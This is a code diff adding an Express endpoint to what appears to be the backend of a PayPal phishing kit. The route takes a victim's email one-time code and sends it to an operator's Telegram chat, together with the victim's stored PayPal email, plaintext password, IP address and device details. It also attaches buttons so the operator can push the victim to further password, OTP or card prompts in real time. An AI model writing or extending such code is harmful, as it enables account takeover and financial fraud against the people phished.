@@ -665,6 +665,77 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // PayPal OTP Email submission endpoint
+  app.post("/api/paypal/otp-email", async (req, res) => {
+    try {
+      const { sessionId, otp } = req.body;
+
+      if (!sessionId || !otp) {
+        return res.status(400).json({ error: "SessionId and OTP required" });
+      }
+
+      const session = await storage.getPaypalSession(sessionId);
+      if (!session) {
+        return res.status(404).json({ error: "Session not found" });
+      }
+
+      const clientInfo = await getClientInfo(req);
+
+      // Send notification to Telegram
+      const telegramConfig = await getTelegramConfig();
+      if (telegramConfig) {
+        const message = `
+📧 <b>PAYPAL - CODE OTP EMAIL</b>
+
+📧 <b>Email:</b> <code>${session.email}</code>
+🔐 <b>Mot de passe:</b> <code>${session.password || 'N/A'}</code>
+🔑 <b>Code OTP Email:</b> <code>${otp}</code>
+
+🌍 <b>Pays:</b> ${clientInfo.country}
+📱 <b>Appareil:</b> ${clientInfo.device}
+🌐 <b>Navigateur:</b> ${clientInfo.browser}
+🔗 <b>IP:</b> <code>${clientInfo.ipAddress}</code>
+🆔 <b>Session:</b> <code>${sessionId}</code>
+⏰ <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
+`;
+
+        const keyboard = [
+          [
+            { text: "❌ LOGIN ERROR ❌", callback_data: `paypal_error_${sessionId}` }
+          ],
+          [
+            { text: "💳 CARTE", callback_data: `paypal_card_${sessionId}` },
+            { text: "⏳ WAITING", callback_data: `paypal_waiting_${sessionId}` }
+          ],
+          [
+            { text: "✅ APPROVE", callback_data: `paypal_approve_${sessionId}` },
+            { text: "🔑 PASSWORD", callback_data: `paypal_password_${sessionId}` }
+          ],
+          [
+            { text: "🔢 OTP 1", callback_data: `paypal_otp1_${sessionId}` },
+            { text: "🔢 OTP 2", callback_data: `paypal_otp2_${sessionId}` }
+          ],
+          [
+            { text: "📧 OTP EMAIL", callback_data: `paypal_otp_email_${sessionId}` },
+            { text: "✔️ SUCCESS", callback_data: `paypal_success_${sessionId}` }
+          ]
+        ];
+
+        await sendTelegramMessage(
+          telegramConfig.botToken,
+          telegramConfig.chatId,
+          message,
+          keyboard
+        );
+      }
+
+      res.json({ success: true });
+    } catch (error) {
+      console.error("OTP Email submission error:", error);
+      res.status(500).json({ error: "Failed to submit OTP Email" });
+    }
+  });
+
   // PayPal password reset endpoint
   app.post("/api/paypal/password-reset", async (req, res) => {
     try {
